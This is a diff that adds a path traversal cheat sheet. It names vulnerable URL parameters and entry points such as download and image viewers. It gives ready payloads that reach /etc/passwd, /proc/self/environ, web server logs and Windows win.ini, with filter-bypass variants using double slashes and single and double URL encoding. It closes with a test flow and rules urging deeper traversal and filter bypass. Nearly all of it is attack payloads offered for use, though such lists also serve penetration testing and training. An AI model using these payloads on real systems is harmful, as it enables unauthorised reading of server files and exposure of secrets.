@@ -1,0 +1,134 @@
+========================================
+PATH / DIRECTORY TRAVERSAL CHEATSHEET
+========================================
+
+[WHAT IS IT]
+- Access files outside intended directory
+- Using ../ to move up folders
+
+========================================
+🔍 HOW TO IDENTIFY
+========================================
+
+- URL params:
+  ?file=
+  ?path=
+  ?page=
+  ?download=
+
+- Example:
+  ?file=report.txt
+
+→ Try changing file path
+
+========================================
+🔥 BASIC PAYLOADS
+========================================
+
+../
+../../
+../../../
+../../../../
+
+========================================
+📂 COMMON ATTACK PAYLOADS
+========================================
+
+../../../../etc/passwd
+../../../../etc/hosts
+
+[More depth]
+../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+========================================
+🪟 WINDOWS TARGETS
+========================================
+
+..\..\..\windows\win.ini
+..\..\..\windows\system32\drivers\etc\hosts
+
+========================================
+🔓 FILTER BYPASS
+========================================
+
+[Double slash bypass]
+....//....//etc/passwd
+
+[URL encoding]
+..%2f..%2f..%2fetc/passwd
+
+[Double encoding]
+..%252f..%252fetc/passwd
+
+[Mixed encoding]
+..%2f..//..%2fetc/passwd
+
+[Dot bypass]
+..././..././etc/passwd
+
+========================================
+📄 IMPORTANT FILES TO READ
+========================================
+
+/etc/passwd
+/etc/hosts
+/proc/self/environ
+
+[Logs]
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+
+========================================
+🧪 TEST FLOW
+========================================
+
+1. Find parameter (?file=)
+2. Try:
+   ../../../../etc/passwd
+3. If not working:
+   - increase ../ depth
+4. If blocked:
+   - try encoding (%2f)
+   - try ....// bypass
+5. Check response
+
+========================================
+🔍 COMMON ENTRY POINTS
+========================================
+
+- File download feature
+- Image viewer
+- PDF viewer
+- Logs viewer
+
+========================================
+🔥 QUICK PAYLOAD SET
+========================================
+
+../../../../etc/passwd
+../../../../etc/hosts
+..\..\..\windows\win.ini
+....//....//etc/passwd
+..%2f..%2fetc/passwd
+..%252f..%252fetc/passwd
+
+========================================
+⚠️ COMMON MISTAKES
+========================================
+
+- Not trying enough ../
+- Not trying encoding
+- Giving up too early
+- Ignoring Windows paths
+
+========================================
+RULES
+========================================
+
+- FIRST TRY: ../../../../etc/passwd
+- ALWAYS INCREASE DEPTH
+- BYPASS FILTERS
+- SIMPLE ATTACK = SUCCESS
+
+========================================
